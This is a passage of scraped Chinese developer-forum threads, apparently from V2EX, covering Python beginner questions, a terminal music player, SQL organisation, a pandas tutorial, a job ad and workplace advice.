这个好像是那个悲桑的故事\r", "\r", "不过还有这些：\r", "\r", "\r", "\r", "\r", "你们可以好好交流一下，一起搞一搞\r", "\r", "我只是一名不会写代码的吃瓜群众～～～", " 肿么都是黄易音乐的，没见过有虾米的。。", "重复造轮子啦", " 我的天 志同道合的人这么多", " 也不能说重复造轮子，只是展示的很像，解决的小痛点却各有不同", " 恩恩。。", "确实挺好的，不知道缓存机制怎么样", "mark..感谢分享啊", " 目前是用 mpv 自己的缓存，准备下个版本收集点意见建议一步步开发出来。", " 哈哈哈 说句经典的话 “你的支持就是我最大的动力”", "想请教一下楼主这命令行 ui 怎么做的", " 首先获取 terminal_size ，然后计算一下当前要打印的行数和布局，然后直接打印出来，最后捕捉键入信息刷新当前页面。但是要注意多线程打印会跳行，所以在结尾加\\r 。源码在 mellplayer/ui.py 中。", "我把 musicbox 集成到 flask 放到树莓派上，就可以在手机上控制或定时让树莓派放音乐。\r", "现在就用这个当闹钟。 ", " ", "楼主一看就是个 vim 党", " 哈哈哈 猜到了开头 猜不到结局😂", " 啥都玩儿一点儿", "我基本调通他的加密过程，并且在 musicbox 代码基础上修改尝试了一些接口，比如获取某个用户歌单什么的，有兴趣可以交流一下。", " ui 这样写感觉蛮厉害", "win 下装不了\r", "\r", "   Skipping optional fixer: buffer\r", "   Skipping optional fixer: idioms\r", "   Skipping optional fixer: set_literal\r", "   Skipping optional fixer: ws_comma\r", "   running build_ext\r", "   warning: GMP or MPIR library not found; Not building Crypto.PublicKey._fastm\r", "th.\r", "   building 'Crypto.Random.OSRNG.winrandom' extension\r", "   error: Unable to find vcvarsall.bat", "抱歉，没看清，目前不支持 win", " 那真是极好的，交流交流，怎么联系？", " 哈哈哈 过奖了", " 目前 linux 还有些问题，我会逐步完善这个项目 感谢支持", "mark 一下，支持支持 ～～", "我这边系统是 macOS 10.12.3 ，一进选歌单环境界面就 Crash 了\r", "报错原因：“ Fatal Python error: Cannot recover from stack overflow.”\r", "运行环境 Python3.6.0 ，是 brew 安装的", " 感谢感谢", " 嗨，能把全部报错信息推上来么，推到 github 上也行。我马上去查", " id 就是 github ib 里面有邮箱", " 已发 GitHub Issue", " ok", " 已收到，我升级一下，如果产生同样的报错我会尽快解决，保持联系哈", "厉害了。居然破解了网易加密接口的方法。", " 是大神破的", "window 不能用吗？", " 目前还没支持，有感兴趣的朋友可以一起开发哈。", "谢谢大家的支持😄", "为楼主点个赞", " 谢谢😄"]},
{"content": "", "reply": "4", "tittle": "安装 Python 时，明明选择了安在 F 盘，为啥安装目录还是出现 c 盘啊", "comment": ["那你得好好问问明明。", "楼上好 我叫小名叫明明，怀疑是楼主按错了", "明明是选择了 F 盘没错，那你有选择了安装在 F 盘吗", " 调皮\r", "\r", " \r", " 我试过几次了，我选择了 f 盘， f 里面出现了一些相关文件夹（ Dlls,DOC...，),但是还是能在 c 盘上找到 python （ win10 系统里有个存储，里面能看安装在相应盘里的东西）"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>新手今天第一天学习 py ，碰到了一个问题，我用的 python2.7.10 版本的，我不知道我自己写的脚本放到 python 的那个目录，有没有知道的，给点指点</p>\n</div></div>"], "reply": "17", "tittle": "新手学习 Python", "comment": ["新建个文件夹放脚本即可", "随便放哪里都行。", "如果是 windows 不要放在中文路径里", "1. 若无特殊需要，不妨直接学 Python 3 ， 3 在某些地方更简明，而且迟早要转到 3 。\r", "2. 推荐先过一遍 Python 自带的 The Python Tutorial ，或者看《 Python 基础教程》。", "现在很多教程都是 Python2 ，不过还是建议用 Python3 。", "只要 python 环境在 path 里面，在那个目录下都可以\r", "\r", "有问题可以加我们的群问，这样效率更高，这个群是一群工程师组建的面向初学者的 python Linux 学习群， qq 群号： 278529278 ，非商业性质，拒绝广告，只接收真正想学这方面技术的朋友，交流学习，申请请说明来自 v2ex", "你要学吗，收费教一波， python3 从入门到放弃。", " 可以没得问题，多少钱啊？", " 谢谢", " 谢谢", " 谢谢", " 谢谢指点", "学习下用 virtualenv 隔离 python2 和 python3 的环境 用啥都可以", " 不贵哈  有兴趣可以加我微信 用户名就是。在录一些视频，同时提供问答服务。", " 微信号多少啊？", " nn37r06u3", " 我已经加你微信了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>过去的项目经验一般在操作数据库这块都是使用 ORM ，</p>\n<p>能比较好的使用一些面向对象的特性，方便习惯了</p>\n<p>现在有一个项目需要全局使用 sql 操作数据库，\n每一处的增删改查都是一句或几句 sql ，</p>\n<p>请问下这种情况下如何组织代码更好一些，有没有什么最佳实践可供参考？</p>\n</div></div>"], "reply": "19", "tittle": "不使用 ORM 时如何更好组织代码？", "comment": ["linq 路过，微微一笑。", "封装个数据库操作类吧，再进一步封装就又成 orm 了", "5999", "将 sql 存到配置文件或数据库，不要写到代码里。", "存储过程", "自己写方法封装 SQL ，注意注入攻击", "Mybatis 不就是直接调用 SQL 语句？\r", "\r", "当然 Mybatis 不是 python 的框架，可以用来参考，很多情况下直接使用 SQL 语句比 ORM 还更方便一些，由于是业务逻辑比较复杂的情况下。", "记得在 sf.gg 就见到过有人说： orm 本来就是为了顺应面向对象而出的失败产物， orm 对于一些关联表和自联表（比如说无限极分类）完全不能按照正常人的思维来封装和理解。", "所以综上所述，哪个方便哪个来。", "我个人觉得看有换行和格式化过的 sql 会比 orm 操作代码更加清晰明了，所以我在 laravel 和 python 里面一直用的是查询构造器而不是 orm 。", "我的体会是，\r", "\r", "ORM 好处是可以借助 IDE 来提高编码效率（毕竟都是面向对象的类与实例 IDE 看得懂，即可以在编码时更好的自动补全代码，也可以更好的自动分析代码中的潜在问题），缺点也是不用 IDE 就没意思了；\r", "\r", "使用 sql builder 的好处是可以自由应对除普通 CRUD 外的奇怪查询需求，代码看起来也没有 ORM 那么啰嗦，缺点是维护起来会苦逼。", "我的建议仍然是把语句拆分成 orm 操作。否则可维护性和开发效率太不平衡了。你用任何方式封装大量的操作，最后会发现，他都是个 orm ar 之类的东西。", "阿里不是刚放出一个手册", " python 有啥好用的构造器推荐不", "总是手工 SQL 语句的路过.", "sqlalchemy sql expression\r", "\r", "我们 erp 的报表都是用这个的, 维护性很高(直接用 sql 根本无法维护)", "存储过程", "使用代码生成", "用 Node.JS / TypeScript 的话可以考虑用 Schemats ， ", " \r", "如果你用 sqalchemy ，也是可以通过 model 去生成 sql ，然后执行。当然你的 sql 过于复杂除外"]},
{"content": ["<div class=\"topic_content\">针对 A 站搜索功能弱，自己搞了个。\r<br>可以根据文章类型，作者，发布时间，关键词来精确查找。\r<br>地址:www.acsearch.cn\r<br>目前跑在一个$5 的 VPS 上。\r<br>至于为啥没有包含诸如视频的搜索，因为是写解析写累了。。\r<br>以后再说。。</div>"], "reply": "5", "tittle": "整了一个 A 站文章区的搜索引擎。", "comment": ["很快就有人帮你压测了。。。", "然而我 a 日常炸，搜索了也看不见哇", " 主要是$5 的 VPS 内存不够，不然我可以用 redis 来 cache 。。抗压能力会大增。访问频率控制的 limiter 还没加", " \r", " [漫画·喵玉 1625] 心庵 [不安亭] \r", "日常笑炸不安亭终于把黑手伸向了铃奈庵\r", "作者：本居小鈴类型：文章 漫画·小说发布日期： 2016 年 10 月 17 日 11:05\r", "\r", "详情\r", " [内涵囧图] 日常爆炸什么的醉讨厌了！ 昨晚剩下的晚间囧图\r", "晚间囧图补完计划~！\r", "作者：犬男类型：文章 综合发布日期： 2016 年 9 月 22 日 14:31\r", "\r", "详情\r", " [内涵囧图] 追星不易，且行且珍惜\r", "A 站日常爆炸，昨天中午稿子炸没了。 up 很抱歉，会在今天之内重做，在此道歉。也希望各位能对 A 站多一点包容。\r", "作者：犬男类型：文章 综合发布日期： 2016 年 8 月 25 日 15:14\r", "\r", "详情\r", "1\r", "有啊。", "这是 ACFUN 的文章区的搜索引擎，不是 A 。 V 的搜索引擎。想歪的哥们就别点了。\r", "高级搜索没人用啊。。"]},
{"content": ["<div class=\"topic_content\">目前比较感兴趣的是 Vanilla ，但不知道怎么迁移数据。。</div>"], "reply": "12", "tittle": "有没有 Python 写的论坛，支持从 discuz 迁移数据？", "comment": ["自己看下表结构直接转过去，跑几句 sql 的事。", "楼主你要是搞定了记得写个教程", "这个不是很简单吧，需要比较熟悉 discuz", "就是一个数据库换个程序读写而已吧？很难吗", "我搜了一下，不是 Python 写的吧", "discuz 那么多复杂的业务逻辑，只读个 sql 应该不行吧", "楼上说说都简单的。真要转起来，一堆麻烦事呢。", " DZ 那么多的表，没看懂估计还不好转", "友情提醒楼上们： Discuz 的表有三百多个", "DZ 里面巨多表逻辑很复杂，几句 sql 还真搞不定", " \r", " \r", " \r", "关键是目标数据库简单。", "楼主成功了也分享一下教程， mark 一下"]},
{"content": ["<div class=\"topic_content\">佛山市银刃信息技术服务有限公司\r<br>简历请投递： <a target=\"_blank\" href=\"mailto:mayfanfan@dingtalk.com\">mayfanfan@dingtalk.com</a> \r<br>\r<br>你所需要的做的： \r<br>1 、参与需求收集与整理，负责设计系统； \r<br>2 、参与系统开发、测试； \r<br>3 、系统维护； \r<br>4 、管理后端研发部； \r<br>\r<br>我们的要求： \r<br>1 、不少于 2 年的 Python 开发经验，理解 Python 哲学； \r<br>2 、熟练掌握至少一种 Python Web 框架，并有实际经验， Django 或 Flask 优先； \r<br>3 、主导过 Web 项目的设计和开发，有良好的编程理念和项目架构设计经验； \r<br>4 、熟悉 Memcache 或者 Redis ，且有实战经验； \r<br>5 、熟悉 Postgresql/MySQL/Sqlite ，掌握常用的 SQL 优化技能； \r<br>6 、了解 Linux ，知道 wsgi ，熟悉 wsgi 项目的部署; \r<br>7 、自我驱动的学习和工作习惯，对未知技术和领域能快速掌握并实践； \r<br>8 、掌握至少 1 种压力测试的方法，且有实际操作经验； \r<br>9 、有线上项目可以演示。 \r<br>\r<br>[加分项] \r<br>1 、有分布式系统的开发经验； \r<br>2 、有敏捷开发的经验，熟悉 Redmine/Gitlab/Trac/Git/Hg 等工具； \r<br>3 、熟悉前端开发技术； \r<br>4 、参加过著名的 Web 产品 /项目研发； \r<br>5 、有自己的技术博客。 \r<br>\r<br>\r<br>\r<br>说了辣么多 \r<br>\r<br>我们来点实际的吧 \r<br>\r<br>也是你们所关心的——福利 \r<br>\r<br>福利在这呢： \r<br>\r<br>1.薪资： 10K~18K \r<br>\r<br>2.你不仅仅只是一个普通的工程师，你的未来： \r<br>\r<br>发展途径：（专业岗）高级——资深——专家 \r<br>\r<br>（管理岗）团队组长——经理——总监 \r<br>\r<br>甚至是......转岗（在银刃无所不奇）只要你能，你可以！ \r<br>\r<br>每半年的一次岗位晋升申请调整，还有什么公司可以这么任性？ \r<br>\r<br>3.办公环境文艺优雅舒适，全是 90 后的小鲜肉，帅气老板 Nice,公司氛围好； \r<br>\r<br>4.生日=生日歌+生日红包+月生日会，结婚礼金，生育礼金； \r<br>\r<br>5.厨艺堪比星级酒店的阿姨，为我们献上营养丰富的中餐+晚餐； \r<br>\r<br>6.距家较远也不用担心，还有温馨的员工宿舍提供呢； \r<br>\r<br>7.未完待遇，不断开发 ing...\r<br>\r<br>\r<br>地址：佛山市南海区平洲昆岗西路 7 号翠皇府 4 楼</div>"], "reply": "目前尚无回", "tittle": "诚聘高级 Python 开发工程师（包食宿+工作环境优美+期权）", "comment": []},
{"content": ["<div class=\"topic_content\">自己的一个小项目想要实现简易的知乎的话题功能，我基础差，技术也不咋的，就想找现成的，网上说需要实现有向图，在 v2 上发现有人问过：\r<br><a target=\"_blank\" href=\"https://www.v2ex.com/t/191083#reply11\" rel=\"nofollow\">https://www.v2ex.com/t/191083#reply11</a>\r<br>\r<br>然后我在 github 上发现了一个个人觉得非常不错的ｄｊａｎｇｏ库，实现了 dag ：\r<br><a target=\"_blank\" href=\"https://github.com/elpaso/django-dag/tree/master/django_dag\" rel=\"nofollow\">https://github.com/elpaso/django-dag/tree/master/django_dag</a>\r<br>看了它的单元测试，发现提供的功能对我来说完全够用了，另外如果节点很多很深的话可以把节点的祖父节点和子孙节点都缓存起来提高性能。\r<br>这个小项目做完去看看有向图和这个库的源码学习学习\r<br>\r<br>不知道大家有实现过类似功能么，涨涨知识</div>"], "reply": "10", "tittle": "数据库中如何存储有向图？", "comment": ["不知道有啥意图……这是要通过存储的规则保证无环？", "\r", "里面有提到 图存储的 nosql 数据库", "neo4j 就能搞。还有 orientdb, arangedb 都可以，", " #1 是我标题没取对，主要是我涨知识了，分享给跟我一样的菜鸟，同时像大神取经", "NEO4J 我用过，自己用，社区版还是可以的", "请问用ｍｙｓｑｌ实现的 dag 和现有的图形数据库相比，有什么优缺点呢，我现在还没深入理解原理和实现", "twitter 有开源的 grapdb", "邻接表", "邻接矩阵，邻接表", "做过可配置的计算工作流，数据用 graphml 表达，前端 jointjs ，解决有向图没问题，自己实现一个邻接表也不难"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>广告 Time ！</p>\n<p>2017 机器学习技术大会系列直播！</p>\n<p>主题：机器学习的理论基础</p>\n<p>时间： 3 月 2 日（明晚）晚 8 点</p>\n<p>特邀嘉宾：汪进，惠普资深人工智能专家</p>\n<p>直播报名链接： <a href=\"http://boolan.com/\" rel=\"nofollow\">http://boolan.com/</a></p>\n<p>直播结束后，群内还将送出 5 本机器学习相关书籍~</p>\n</div></div>", "<div class=\"topic_content\">3 月 14 日，周二晚 8 点，机器学习直播继续！\r<br>\r<br>直播主题：使用 TensorFlow 搭建机器学习应用\r<br>\r<br>直播报名： <a target=\"_blank\" href=\"http://boolan.com/sign-up/live\" rel=\"nofollow\">http://boolan.com/sign-up/live</a></div>"], "reply": "3", "tittle": "机器学习系列直播！", "comment": ["点了微信登录 n 多次 登录不了 难道只有我这样子吗", " 额……现在还是不行么？", "试听，二维码过期"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://p1.bqimg.com/1949/d47e9f7237c99ae4.png\" rel=\"nofollow\">http://p1.bqimg.com/1949/d47e9f7237c99ae4.png</a></p>\n<p><a href=\"http://p1.bqimg.com/1949/e97af30172ba6985.png\" rel=\"nofollow\">http://p1.bqimg.com/1949/e97af30172ba6985.png</a></p>\n<p>用的python版本是3.5.2</p>\n<p>第一章图是我导入模块时报的错。简要说明下：\n用 from apis import APIError pycharm 直接提示模块找不到,于是用 from .apis import APIError pycharm 虽然没有提示有问题，但是运行是报 SystemError: Parent module '' not loaded, cannot perform relative import 。图中我都用箭头标出来了。</p>\n<p>第二张图是 pycharm 的默认配置。</p>\n<p>我用 from .apis import APIError 意思不就是导入当前路径下的模块么，为什么运行时报错呢？这个问题怎么解决呢，各位帮忙下！感谢！</p>\n</div></div>"], "reply": "15", "tittle": "求助！关于 pycharm 导入自定义模块的问题！", "comment": ["pycharm 版本是 2016.2.3", "加个__init__.py  。。。", "自定义模块要放在一个 package 中，也就是文件夹中必须有一个__init__.py 才能作为自定义包来引用", "要理解什么是包，   何为  __init__.py", " ", " 为什么我改成这样就可以了？并没有加__init__.py ，用 from apis import APIError ，虽然 pycharm 提示找不到模块，但是代码却正确执行了？我现在的所有代码都是在 www 同一个目录下的", " ", " 为什么我改成这样就可以了？并没有加__init__.py ，用 from apis import APIError ，虽然 pycharm 提示找不到模块，但是代码却正确执行了？我现在的所有代码都是在 www 同一个目录下的", "  看错了，尴尬，无视我#2 那句", "因为 IDE 的搜索路径应该是以 mblog 为根目录的。所以提示找不到模块，其实我平常都是忽略这些检查的", "  ", " 为什么我改成这样就可以了？并没有加__init__.py ，用 from apis import APIError ，虽然 pycharm 提示找不到模块，但是代码却正确执行了？我现在的所有代码都是在 www 同一个目录下的", " 懂了！所以可以在 www 目录下建个__init__.py 这样导入 from ", " imprt APIError.那么导入同一个目录下的文件，不需要__init__.py ，因为并没有跨 package 导入。是吗？", "我记得 pycharm 可以自定义项目根目录的功能，你可以查查看", "是这个吧\r", "www - right click - Mark Directory As - Sources Root", "mark directory as source root ?", " 恩恩", "from .apis import APIError 是相对引用, 把点去掉就可以了."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>python 数据分析之 pandas 进阶（二）</h2>\n<h1>六、分组</h1>\n<p>对于“ group by ”操作，我们通常是指以下一个或多个操作步骤：</p>\n<p>（ Splitting ）按照一些规则将数据分为不同的组\n（ Applying ）对于每组数据分别执行一个函数\n（ Combining ）将结果组合刀一个数据结构中\n将要处理的数组是：</p>\n<pre><code>df = pd.DataFrame({\n        'A': ['foo', 'bar', 'foo', 'bar', 'foo', 'bar', 'foo', 'foo'],\n        'B': ['one', 'one', 'two', 'three', 'two', 'two', 'one', 'three'],\n        'C': np.random.randn(8),\n        'D': np.random.randn(8)\n    })\ndf\n \n\tA\tB\tC\t        D\n0\tfoo\tone\t0.961295\t-0.281012\n1\tbar\tone\t0.901454\t0.621284\n2\tfoo\ttwo\t-0.584834\t0.919414\n3\tbar\tthree\t1.259104\t-1.012103\n4\tfoo\ttwo\t0.153107\t1.108028\n5\tbar\ttwo\t0.115963\t1.333981\n6\tfoo\tone\t1.421895\t-1.456916\n7\tfoo\tthree\t-2.103125\t-1.757291\n</code></pre>\n<p>1 、分组并对每个分组执行 sum 函数：</p>\n<pre><code>df.groupby('A').sum()\n \n\tC\t        D\nA\t\t\nbar\t2.276522\t0.943161\nfoo\t-0.151661\t-1.467777\n</code></pre>\n<p>2 、通过多个列进行分组形成一个层次索引，然后执行函数：</p>\n<pre><code>df.groupby(['A', 'B']).sum()\n \n\t\tC\t        D\nA\tB\t\t\nbar\tone\t0.901454\t0.621284\n        three\t1.259104        -1.012103\n        two\t0.115963        1.333981\nfoo\tone\t2.383191\t-1.737928\n        three\t-2.103125\t-1.757291\n        two\t-0.431727\t2.027441\n</code></pre>\n<h1>七、 Reshaping</h1>\n<p>Stack</p>\n<pre><code>tuples = list(zip(*[['bar', 'bar', 'baz', 'baz',\n                     'foo', 'foo', 'qux', 'qux'],\n                    ['one', 'two', 'one', 'two',\n                     'one', 'two', 'one', 'two']]))\ntuples\n \n[('bar', 'one'),\n ('bar', 'two'),\n ('baz', 'one'),\n ('baz', 'two'),\n ('foo', 'one'),\n ('foo', 'two'),\n ('qux', 'one'),\n ('qux', 'two')]\n</code></pre>\n<pre><code>index = pd.MultiIndex.from_tuples(tuples, names=['first', 'second'])\ndf = pd.DataFrame(np.random.randn(8, 2), index=index, columns=['A', 'B'])\ndf2 = df[:4]\ndf2\n \n\t\t A\t        B\nfirst\tsecond\t\t\nbar\tone\t-0.907306\t-0.009961\n        two\t0.905177\t-2.877961\nbaz\tone\t-0.356070\t-0.373447\n        two\t-1.496644\t-1.958782\n</code></pre>\n<pre><code>stacked = df2.stack()\nstacked \n \nfirst  second   \nbar    one     A   -0.907306\n               B   -0.009961\n       two     A    0.905177\n               B   -2.877961\nbaz    one     A   -0.356070\n               B   -0.373447\n       two     A   -1.496644\n               B   -1.958782\ndtype: float64\n</code></pre>\n<pre><code>stacked.unstack()\n \n\t\tA\t        B\nfirst\tsecond\t\t\nbar\tone\t-0.907306\t-0.009961\n        two\t0.905177\t-2.877961\nbaz\tone\t-0.356070\t-0.373447\n        two\t-1.496644\t-1.958782\n</code></pre>\n<pre><code>stacked.unstack(1)\n \n\tsecond\tone\t       two\nfirst\t\t\t\nbar\tA\t-0.907306\t0.905177\n        B\t-0.009961\t-2.877961\nbaz\tA\t-0.356070\t-1.496644\n        B\t-0.373447\t-1.958782\n</code></pre>\n<h1>八、相关操作</h1>\n<p>要处理的数组为：</p>\n<pre><code>df\n \n\t        A\t        B\t        C\t        D\tF\n2013-01-01\t0.000000\t0.000000\t0.135704\t5\tNaN\n2013-01-02\t0.139027\t1.683491\t-1.031190\t5\t1\n2013-01-03\t-0.596279\t-1.211098\t1.169525\t5\t2\n2013-01-04\t0.367213\t-0.020313\t2.169802\t5\t3\n2013-01-05\t0.224122\t1.003625\t-0.488250\t5\t4\n2013-01-06\t0.186073\t-0.537019\t-0.252442\t5\t5\n</code></pre>\n<p>(一)、统计</p>\n<p>1 、执行描述性统计：</p>\n<pre><code>df.mean()\n \nA    0.053359\nB    0.153115\nC    0.283858\nD    5.000000\nF    3.000000\ndtype: float64\n</code></pre>\n<p>2 、在其他轴上进行相同的操作：</p>\n<pre><code>df.mean(1)\n \n2013-01-01    1.283926\n2013-01-02    1.358266\n2013-01-03    1.272430\n2013-01-04    2.103341\n2013-01-05    1.947899\n2013-01-06    1.879322\nFreq: D, dtype: float64\n</code></pre>\n<p>3 、对于拥有不同维度，需要对齐的对象进行操作， pandas 会自动的沿着指定的维度进行广播</p>\n<pre><code>dates\ns = pd.Series([1,3,4,np.nan,6,8], index=dates).shift(2)\ns\n \nDatetimeIndex(['2013-01-01', '2013-01-02', '2013-01-03', '2013-01-04',\n               '2013-01-05', '2013-01-06'],\n              dtype='datetime64[ns]', freq='D')\n \n2013-01-01   NaN\n2013-01-02   NaN\n2013-01-03     1\n2013-01-04     3\n2013-01-05     4\n2013-01-06   NaN\nFreq: D, dtype: float64\n</code></pre>\n<p>(二)、 Apply</p>\n<p>对数据应用函数：</p>\n<pre><code>df.apply(np.cumsum)\n \n\t        A\t        B\t        C\t        D\tF\n2013-01-01\t0.000000\t0.000000\t0.135704\t5\tNaN\n2013-01-02\t0.139027\t1.683491\t-0.895486\t10\t1\n2013-01-03\t-0.457252\t0.472393\t0.274039\t15\t3\n2013-01-04\t-0.090039\t0.452081\t2.443841\t20\t6\n2013-01-05\t0.134084\t1.455706\t1.955591\t25\t10\n2013-01-06\t0.320156\t0.918687\t1.703149\t30\t15\n</code></pre>\n<pre><code>df.apply(lambda x: x.max() - x.min())\n \nA    0.963492\nB    2.894589\nC    3.200992\nD    0.000000\nF    4.000000\ndtype: float64\n</code></pre>\n<p>(三)、字符串方法</p>\n<p>Series 对象在其 str 属性中配备了一组字符串处理方法，可以很容易的应用到数组中的每个元素。</p>\n<pre><code>s = pd.Series(['A', 'B', 'C', 'Aaba', 'Baca', np.nan, 'CABA', 'dog', 'cat'])\ns.str.lower()\n \n0       a\n1       b\n2       c\n3    aaba\n4    baca\n5     NaN\n6    caba\n7     dog\n8     cat\ndtype: object\n</code></pre>\n<h1>九、时间序列</h1>\n<p>1 、时区表示：</p>\n<pre><code>rng = pd.date_range('3/6/2012 00:00', periods=5, freq='D')\nts = pd.Series(np.random.randn(len(rng)), rng)\nts\n \n2012-03-06   -0.932261\n2012-03-07   -1.405305\n2012-03-08    0.809844\n2012-03-09   -0.481539\n2012-03-10   -0.489847\nFreq: D, dtype: float64\n</code></pre>\n<pre><code>ts_utc = ts.tz_localize('UTC')\nts_utc\n \n2012-03-06 00:00:00+00:00   -0.932261\n2012-03-07 00:00:00+00:00   -1.405305\n2012-03-08 00:00:00+00:00    0.809844\n2012-03-09 00:00:00+00:00   -0.481539\n2012-03-10 00:00:00+00:00   -0.489847\nFreq: D, dtype: float64\n</code></pre>\n<p>2 、时区转换</p>\n<pre><code>ts_utc.tz_convert('US/Eastern')\n \n2012-03-05 19:00:00-05:00   -0.932261\n2012-03-06 19:00:00-05:00   -1.405305\n2012-03-07 19:00:00-05:00    0.809844\n2012-03-08 19:00:00-05:00   -0.481539\n2012-03-09 19:00:00-05:00   -0.489847\nFreq: D, dtype: float64\n</code></pre>\n<p>3 、时区跨度转换</p>\n<pre><code>rng = pd.date_range('1/1/2012', periods=5, freq='M')\nts = pd.Series(np.random.randn(len(rng)), index=rng)\nps = ts.to_period()\nts\nps\nps.to_timestamp()\n \n2012-01-31    0.932519\n2012-02-29    0.247016\n2012-03-31   -0.946069\n2012-04-30    0.267513\n2012-05-31   -0.554343\nFreq: M, dtype: float64\n\n2012-01    0.932519\n2012-02    0.247016\n2012-03   -0.946069\n2012-04    0.267513\n2012-05   -0.554343\nFreq: M, dtype: float64\n \n2012-01-01    0.932519\n2012-02-01    0.247016\n</code></pre>\n<pre><code>ts = pd.Series(np.random.randn(1000), index=pd.date_range('1/1/2000', periods=1000))\nts = ts.cumsum()\nts2012-03-01   -0.946069\n2012-04-01    0.267513\n2012-05-01   -0.554343\nFreq: MS, dtype: float64\n</code></pre>\n<h1>十、画图</h1>\n<pre><code>ts = pd.Series(np.random.randn(1000), index=pd.date_range('1/1/2000', periods=1000))\nts = ts.cumsum()\nts\n</code></pre>\n<img src=\"https://pic2.zhimg.com/v2-b97314317b5a059d22e7fe9b473b7341_b.png\">\n<h1>十一、 Categorical</h1>\n<p>从 0.15 版本开始， pandas 可以在 DataFrame 中支持 Categorical 类型的数据</p>\n<pre><code>df = pd.DataFrame({\n        'id':[1,2,3,4,5,6],\n        'raw_grade':['a','b','b','a','a','e']\n    })\ndf\n \n\tid\traw_grade\n0\t1\ta\n1\t2\tb\n2\t\n4\ta\n4\t5\ta\n5\t6\te\n</code></pre>\n<p>1 、将原始的 grade 转换为 Categorical 数据类型：</p>\n<pre><code>df['grade'] = df['raw_grade'].astype('category', ordered=True)\ndf['grade'] \n \n0    a\n1    b\n2    b\n3    a\n4    a\n5    e\nName: grade, dtype: category\nCategories (3, object): [a &lt; b &lt; e]\n</code></pre>\n<p>2 、将 Categorical 类型数据重命名为更有意义的名称：</p>\n<pre><code>df['grade'].cat.categories = ['very good', 'good', 'very bad']\n</code></pre>\n<p>3 、对类别进行重新排序，增加缺失的类别：</p>\n<pre><code>df['grade'] = df['grade'].cat.set_categories(['very bad', 'bad', 'medium', 'good', 'very good'])\ndf['grade']\n \n0    very good\n1         good\n2         good\n3    very good\n4    very good\n5     very bad\nName: grade, dtype: category\nCategories (5, object): [very bad &lt; bad &lt; medium &lt; good &lt; very good]\n</code></pre>\n<p>4 、排序是按照 Categorical 的顺序进行的而不是按照字典顺序进行：</p>\n<pre><code>df.sort('grade')\n \n\tid\traw_grade\tgrade\n5\t6\te\t        very bad\n1\t2\tb\t        good\n2\t3\tb\t        good\n0\t1\ta\t        very good\n3\t4\ta\t        very good\n4\t5\ta\t        very good\n</code></pre>\n<p>5 、对 Categorical 列进行排序时存在空的类别：</p>\n<pre><code>df.groupby(\"grade\").size()\n \ngrade\nvery bad     1\nbad          0\nmedium       0\ngood         2\nvery good    3\ndtype: int64\n</code></pre>\n<h1>以上代码不想自己试一试吗？</h1>\n<p><a href=\"http://www.raquant.com/?pk_campaign=v2ex\" rel=\"nofollow\">镭矿 raquant</a>提供 jupyter 在线练习学习 python 的机会，无需安装 python 即可运行 python 程序。</p>\n</div></div>"], "reply": "2", "tittle": "Python 数据分析之 pandas 进阶（二）", "comment": ["pandas 进阶（一）呢", "\r", "\r", "在这里呀：）"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://un.cctv.com/live/cs/btv2/index.shtml\" rel=\"nofollow\">http://un.cctv.com/live/cs/btv2/index.shtml</a> ，不是直播节目，前一天回看的视频如何下载？</div>"], "reply": "目前尚无回", "tittle": "请假这样的网站视频怎么下载？", "comment": []},
{"content": "", "reply": "5", "tittle": "求助 如何使用 pycharm 断点调试 celery worker task", "comment": ["用调试模式启动 celery 的 worker", "“八荣八耻”", " Guido 都用 PyCharm ，排斥 debugger 在现代的软件开发中简直是反智主义。", "pycharm 调试大文件貌似有问题，不知道现在修复了没？", " 谢谢，已经搞定了~"]},
{"content": ["<div class=\"topic_content\">入职不到三周，项目组安排我负责数据挖掘方面预测模型构建，因为该项目还有两个月结束，负责需求的领导有点着急，想赶紧做出点可视化的东西给领导看，所以要求我两周内要有一个分析结果并做出一个可视化的界面，但是技术经理要求我把重点放在模型选择与调优上，不要着急开发。我能如何抉择？(ps:貌似需求经理话语权更重，之前听他说了句项目是他说了算。)</div>"], "reply": "19", "tittle": "两位领导的要求不一样，我该如何应对？", "comment": ["让他们两个打一架，商量好了先", "直接传话呗， 不要当受气包", "把大领导的话传给小领导 看看小领导怎么说?\r", "如果小领导让你听他的 那么你去问老板 也就是给你开工资的人.", "直接让你两位经理商量，不过感觉技术很难赢需求", "谁官大听谁！\r", "\r", "以前在学校做外包，给副院长做了设计，很满意，到最后院长不满意，我直接不理副职和院长沟通，只要副院长提意见，我就说:院长说要这样！\r", "\r", "因为刚开始我以为副院长应该是带头人了，属于分管的。后来发现他也是中间人……", "然后我和院长聊了十几分钟，我 ps 设计(抄袭)一下午，第二天通过，下午写了几个 html ，工时 3 天，赚了 3 千。\r", "\r", "因为学校的 cms 比较另类，一般人做不了，哈哈。", "直接说出来，不要憋着，否则容易背锅。", "礼貌点说：“我做这个是没问题的，但是 A 经理说要我把那个做完，就目前的情况来看我只能完成一个，您看你们是不是先商量一下。”", "发邮件就解决了。", "楼上的恢复…………都好………………\r", "对自己的工作做排期，发邮件给技术经理，抄送需求经理\r", "敬请审阅审批，以新人姿态询问这样安排是否合理", "把问题抛出去就行，具体让领导们看着办吧", "同楼上，走一下邮件就解决了。", "你就当传话筒就好了。不要把事情都揽在自己身上", "两者冲突，抛出异常", "听直属上司的", "你让技术经理给你发个备忘录 email 然后按技术经理的 email 来做=。=\r", "“留证据”", "[×] 问 v2 网友怎么办\r", "\r", "[√]问发工资的老板咋办", "沟通沟通沟通，公司里面最重要就是要沟通。  不管最后是听谁的，都一定要沟通清楚。", "反正吧，我的经验就是无论最后怎么说，出个邮件，按着邮件走，反正最后他们只认邮件。"]},
